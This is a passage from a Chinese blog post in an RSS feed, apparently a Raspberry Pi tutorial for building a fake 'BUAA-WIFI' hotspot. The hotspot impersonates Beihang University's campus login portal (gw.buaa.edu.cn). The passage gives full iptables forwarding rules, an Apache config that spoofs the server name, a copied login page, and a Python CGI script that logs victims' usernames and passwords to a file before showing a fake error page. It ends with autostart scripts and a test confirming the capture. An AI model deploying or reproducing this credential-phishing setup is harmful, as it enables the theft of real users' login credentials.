&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加iptables规则&lt;/p&gt;

    &lt;p&gt;修改/etc/sysctl.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; net.ipv4.ip_forward=1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;修改/proc/sys/net/ipv4/ip_forward为1&lt;/p&gt;

    &lt;p&gt;添加转发规则：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 # sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 # sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后用iptables -t nat -S和iptables -S检查是否添加成功&lt;/p&gt;

    &lt;p&gt;为了让上面的规则在开始时自动添加，执行：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sh -c &quot;iptables-save &amp;gt; /etc/iptables.ipv4.nat&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;设置wlan0的静态IP&lt;/p&gt;

    &lt;p&gt;修改/etc/network/interfaces，添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; auto wlan0
 allow-hotplug wlan0
 iface wlan0 inet static
         address 192.168.126.126    # 与之前dhcpd.conf填写的网关地址相同
         netmask 255.255.255.240    # 与之前dhcpd.conf填写的子网掩码相同
 up iptables-restore &amp;lt; /etc/iptables.ipv4.nat
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置apache2&lt;/p&gt;

    &lt;p&gt;apache2提供的是为将重定向的流量引导到本机服务器运行的网页中，Kali中已经安装好apache2了&lt;/p&gt;

    &lt;p&gt;修改/etc/apache2/sites-available/default，在合适的标签下添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;VirtualHost *:80&amp;gt;
 ...
 ServerName gw.buaa.edu.cn             # 伪造服务器名
 DirectoryIndex gw.buaa.edu.cn.html    # 将默认界面改为钓鱼网站页面
 ...
 &amp;lt;Directory &quot;/usr/lib/cgi-bin&quot;&amp;gt;
     AddHandler cgi-script .py         # 添加对.py的支持
 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动apache2：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service apache2 start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写钓鱼网站&lt;/p&gt;

    &lt;p&gt;我要钓鱼的是学校的校园网登录网站，所以copy校园网登录的界面，修改里面的表单提交action，提交到本机服务的后台，例如我的钓鱼网站/var/www/gw.buaa.edu.cn.html：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ...
 &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
     function login() {
         var errorMsg = [];
         var username = $(&quot;input[name=&#39;username&#39;]&quot;).val();
         var password = $(&quot;input[name=&#39;password&#39;]&quot;).val();
         if(username == &#39;&#39; || username == &#39;用户名*&#39;) {
              errorMsg.push(&#39;请输入用户名.&#39;);
              $(&#39;#txtuser&#39;).focus();
         }
         if (password == &#39;&#39; || password == &#39;密码*&#39;) {
             errorMsg.push(&#39;请输入密码.&#39;);
             $(&#39;#txtPwd&#39;).focus();
         }
         if (errorMsg != &quot;&quot;) {
             if (errorMsg.length &amp;gt; 0) {
                 $(&#39;#divloginError&#39;).html(&#39;&#39;).html($(&#39;&amp;lt;ul/&amp;gt;&#39;, {
                     html: &#39;&amp;lt;li&amp;gt;&#39; + errorMsg.join(&#39;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&#39;) + &#39;&amp;lt;/li&amp;gt;&#39;
                 })).show();
                 $(&#39;#dvloginErrorM&#39;).show();
                 $.mobile.silentScroll(125);
             } else {
                 $(&#39;#dvloginErrorM&#39;).hide();
             }
         } else {
             document.aspnetForm.submit();
         }
     }
 &amp;lt;/script&amp;gt;
 ...
 &amp;lt;!--表单提交--&amp;gt;
 &amp;lt;form name=&quot;aspnetForm&quot; method=&quot;post&quot; action=&quot;/cgi-bin/login.py&quot;...&amp;gt;
 &amp;lt;!--用户提交按钮--&amp;gt;
     &amp;lt;a href=&quot;javascript:login()&quot;.../&amp;gt;
 &amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ```
 #!/usr/bin/python
 #-*- encoding: utf-8 -*-
 import cgi, cgitb
 form = cgi.FieldStorage()
 username = form.getvalue(&#39;username&#39;)                # 获得用户名
 password = form.getvalue(&#39;password&#39;)                # 获得密码
 f = open(&#39;/cat/gw.buaa.edu.cn.log&#39;, &#39;a&#39;)            # 注意apache是否有所写文件夹的权限！！
 f.write(&quot;%s: %s\r\n&quot; % (username, password))        # 将用户名和密码写入文件
 f.close()
 print &quot;Content-type:text/html\r\n\r\n&quot;              # 然后显示一个错误页面
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error 126&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Error establishing a database connection&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&#39;
 ```
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;将login.py的权限设置为755，即有运行权限&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将上述配置开机自启动&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # update-rc.d hostapd enable
 # update-rc.d isc-dhcp-server enable
 # update-rc.d apache2 enable	
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;对于dnsmasq，需要手动编写开机启动脚本，在/etc/init.d/下新建文件dnsmasq：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ```
 #!/bin/bash
 set -e
 case &quot;$1&quot; in
         start)
                 dnsmasq&amp;amp;
                 ;;
         stop)
                 killall -9 dnsmasq
                 ;;
         restart)
                 killall -9 dnsmasq
                 dnsmasq&amp;amp;
                 ;;
 esac
 exit 0
 ```
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后进入/etc/rc3.d/下，执行：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # ln -sf /etc/init.d/dnsmasq S06dnsmasq
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;S06表示启动优先级，数字越大，优先级越低，比如服务A的运行要依赖服务B，那A的数字就应该大于B的&lt;/p&gt;

    &lt;p&gt;最后，编辑/etc/rc.local，添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; service dnsmasq start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-3&quot;&gt;测试运行&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先连接上伪热点BUAA-WIFI，然后在浏览器输入一个网址，浏览器将自动跳转到校园网登录界面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-2.jpg&quot; alt=&quot;测试界面&quot; title=&quot;测试界面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当用户输入登录的用户名和密码，点击登录后，将跳转到错误页面，但是用户名和密码都已经被后台服务器记录到文件中。&lt;/p&gt;

&lt;hr /&gt;

</description>
        <pubDate>Sat, 27 Jun 2015 23:13:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</guid>
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        <category>树莓派</category>
        
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        <category>树莓派</category>
        
      </item>
    
  </channel>
</rss>
